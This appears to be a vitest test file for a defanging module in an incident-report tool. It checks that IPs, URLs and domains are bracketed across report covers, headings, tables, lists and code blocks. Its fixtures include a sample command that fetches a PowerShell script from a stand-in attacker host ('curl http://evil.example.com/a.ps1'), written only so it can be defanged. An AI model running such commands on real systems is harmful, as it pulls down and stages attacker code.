/**
 * Written from an attack on the defanger, in both directions.
 */
import { describe, expect, it } from 'vitest'

import { defangDocument, defangIndicator, defangText } from './defang.js'
import type { CodeNode, Document, ListNode, TableNode } from './model.js'

describe('a value the model says is entirely an indicator', () => {
  it('blanks every dot, because the field declared what it holds', () => {
    expect(defangIndicator('evil.example.com')).toBe('evil[.]example[.]com')
    expect(defangIndicator('203.0.113.9')).toBe('203[.]0[.]113[.]9')
  })

  it('keeps a URL readable: scheme and host only, path untouched', () => {
    // A dot inside a path is not an indicator, and mangling it loses
    // information the reader needs.
    expect(defangIndicator('http://evil.example.com/a.b/c.d?x=1.2')).toBe(
      'hxxp://evil[.]example[.]com/a.b/c.d?x=1.2',
    )
  })

  it('preserves the case the analyst typed in the scheme', () => {
    expect(defangIndicator('HTTP://EVIL.COM/x')).toBe('HXXP://EVIL[.]COM/x')
  })

  /**
   * **A bare host, which every other case here gives a path.**
   */
  it.each([
    ['http://evil.example.com', 'hxxp://evil[.]example[.]com'],
    ['https://a.b.c', 'hxxps://a[.]b[.]c'],
    ['http://host?q=1', 'hxxp://host?q=1'],
    ['http://host#f', 'hxxp://host#f'],
  ])('defangs %s with no path at all', (given, expected) => {
    expect(defangIndicator(given)).toBe(expected)
  })

  it.each(['', '   '])('leaves %p alone rather than inventing brackets', (value) => {
    expect(defangIndicator(value)).toBe(value)
  })
})

describe('free text inside a generated block', () => {
  it('defangs an IPv4 literal', () => {
    expect(defangText('beaconed to 203.0.113.9 every hour')).toBe(
      'beaconed to 203[.]0[.]113[.]9 every hour',
    )
  })

  it('defangs a scheme-carrying URL and keeps its path', () => {
    expect(defangText('fetched http://evil.example.com/stage2.ps1 next')).toBe(
      'fetched hxxp://evil[.]example[.]com/stage2.ps1 next',
    )
  })

  /**
   * **The half that matters most, and the one an over-eager rule breaks.**
   */
  it.each([
    'the operator dropped payload.zip on the share',
    'renamed it to invoice.mov before exfil',
    'see evil.example.com in the indicator table',
  ])('leaves a bare domain alone: %s', (text) => {
    expect(defangText(text)).toBe(text)
  })

  it('is not fooled by a version string that is shaped like an address', () => {
    // Octet-validated, so `400` and `1964` disqualify these.
    expect(defangText('agent 1.2.3.400 and build 5.2.1.1964')).toBe(
      'agent 1.2.3.400 and build 5.2.1.1964',
    )
  })
})

/**
 * The smallest document that still has each place a string can hide.
 */
function documentWith(sections: Document['sections'], cover?: Document['cover']): Document {
  return { title: 'RCA', tlp: 'TLP:RED', language: 'en', languageCoverage: 1, sections, cover }
}

describe('the pass over a built document', () => {
  const table = (): TableNode => ({
    type: 'table',
    header: ['Indicator', 'Context'],
    rows: [[{ text: 'evil.example.com', indicator: true }, { text: 'seen at 203.0.113.9' }]],
    widths: [50, 50],
  })

  /**
   * **Page one, and it was the one page nothing walked.**
   */
  it('defangs the cover, which is not a section and not a node', () => {
    const document_ = documentWith([], {
      eyebrow: 'Reported from 198.51.100.7',
      title: 'Phishing, then a payload.zip from 203.0.113.9',
      subtitle: 'Acme  \u00b7  CASE-1  \u00b7  callback to http://evil.example.com/beacon',
      rows: [
        { label: 'First contact', value: { text: 'evil.example.com', indicator: true } },
        { label: 'Source', value: { text: 'seen at 198.51.100.23' } },
      ],
    })

    const cover = defangDocument(document_).cover
    expect(cover?.eyebrow).not.toContain('198.51.100.7')
    expect(cover?.title).not.toContain('203.0.113.9')
    expect(cover?.subtitle).not.toContain('http://evil.example.com')
    expect(cover?.rows[1]?.value.text).not.toContain('198.51.100.23')

    // **The whole value is the indicator here**, so the bare domain is blanked
    // - which it is not in prose, where `.zip` and `.mov` are real TLDs and any
    // "looks like a domain" rule mangles a filename.
    expect(cover?.rows[0]?.value.text).not.toContain('evil.example.com')
    expect(cover?.title).toContain('payload.zip')

    // The labels are the app's own words and carry no address to defang.
    expect(cover?.rows[0]?.label).toBe('First contact')
  })

  it('defangs the document title, which is not inside a section either', () => {
    const document_ = documentWith([])
    document_.title = 'RCA for 198.51.100.7'
    expect(defangDocument(document_).title).not.toContain('198.51.100.7')
  })

  it('defangs a generated section heading, which is not a node', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'b',
          kind: 'indicators',
          heading: 'Callback to http://evil.example.com and 198.51.100.7',
          nodes: [],
        },
      ]),
    )
    expect(out.sections[0]!.heading).not.toContain('http://evil.example.com')
    expect(out.sections[0]!.heading).not.toContain('198.51.100.7')
  })

  /**
   * **The split is on `kind`, and `heading` is one shared field.**
   */
  it("leaves a written section's heading alone, as it leaves its body", () => {
    const out = defangDocument(
      documentWith([
        { blockId: 'w', kind: 'written', heading: 'Notes on 198.51.100.7', nodes: [] },
      ]),
    )
    expect(out.sections[0]!.heading).toBe('Notes on 198.51.100.7')
  })

  it('leaves a document with no cover alone', () => {
    expect(defangDocument(documentWith([])).cover).toBeUndefined()
  })

  it('defangs a cell the builder marked, and the prose beside it, by different rules', () => {
    const out = defangDocument(
      documentWith([{ blockId: 'b', kind: 'indicators', heading: 'Indicators', nodes: [table()] }]),
    )
    const row = (out.sections[0]!.nodes[0] as TableNode).rows[0]!
    expect(row[0]!.text).toBe('evil[.]example[.]com')
    // Free text in the same table: the IP goes, a bare domain would not have.
    expect(row[1]!.text).toBe('seen at 203[.]0[.]113[.]9')
  })

  /**
   * **A written block is the analyst's prose and is left alone.** They defang
   * by convention already, and rewriting it edits their words.
   */
  it('does not touch a written block', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'w',
          kind: 'written',
          heading: 'Root cause',
          nodes: [{ type: 'prose', paras: ['the beacon reached 203.0.113.9'] }],
        },
      ]),
    )
    expect(out.sections[0]!.nodes[0]).toEqual({
      type: 'prose',
      paras: ['the beacon reached 203.0.113.9'],
    })
  })

  /**
   * **Every node kind that carries a string, because the walk is a switch.**
   */
  it('reaches inside a list item and a code block', () => {
    const out = defangDocument(
      documentWith([
        {
          blockId: 'b',
          kind: 'timeline',
          heading: 'What happened',
          nodes: [
            {
              type: 'list',
              items: [{ runs: [{ text: 'callback to 203.0.113.9' }], level: 0, ordered: false }],
            },
            { type: 'code', lines: ['curl http://evil.example.com/a.ps1'] },
          ],
        },
      ]),
    )
    const [list, code] = out.sections[0]!.nodes as [ListNode, CodeNode]
    expect(list.items[0]!.runs[0]!.text).toBe('callback to 203[.]0[.]113[.]9')
    expect(code.lines[0]).toBe('curl hxxp://evil[.]example[.]com/a.ps1')
  })

  it('leaves the document title and the marking alone', () => {
    // A TLP marking is a vocabulary key the painters resolve, not prose.
    const out = defangDocument(documentWith([]))
    expect(out.title).toBe('RCA')
    expect(out.tlp).toBe('TLP:RED')
  })

  it('returns a new document rather than editing the one it was given', () => {
    // The frozen tree of a sent report is stored; a pass that mutated in place
    // would defang it twice on the second read.
    const before = documentWith([
      { blockId: 'b', kind: 'indicators', heading: 'I', nodes: [table()] },
    ])
    const out = defangDocument(before)
    expect((before.sections[0]!.nodes[0] as TableNode).rows[0]![0]!.text).toBe('evil.example.com')
    expect(out).not.toBe(before)
  })

  it('is idempotent, so a document passed twice is not double-bracketed', () => {
    const once = defangDocument(
      documentWith([{ blockId: 'b', kind: 'indicators', heading: 'I', nodes: [table()] }]),
    )
    const twice = defangDocument(once)
    expect((twice.sections[0]!.nodes[0] as TableNode).rows[0]![0]!.text).toBe(
      'evil[.]example[.]com',
    )
  })
})

describe('defangIndicator, against a caller that carries no cap', () => {
  /**
   * **`visuals.ts` joins every entity a timeline entry touches into one cell**
   * and flags it `indicator: true`.
   */
  it('stays linear on a long value holding an interior newline', () => {
    const n = 32_000
    const value = `http://${'a'.repeat(n)}/${'x'.repeat(n)}\ny`

    const started = performance.now()
    defangIndicator(value)

    expect(performance.now() - started).toBeLessThan(100)
  })

  it('defangs the host of a value holding a newline rather than giving up on it', () => {
    // The old pattern failed to match at all here, fell through to blanking
    // every dot in the string, and took the path's dots with it.
    expect(defangIndicator('http://evil.example.com/a.b\nc')).toBe(
      'hxxp://evil[.]example[.]com/a.b\nc',
    )
  })
})
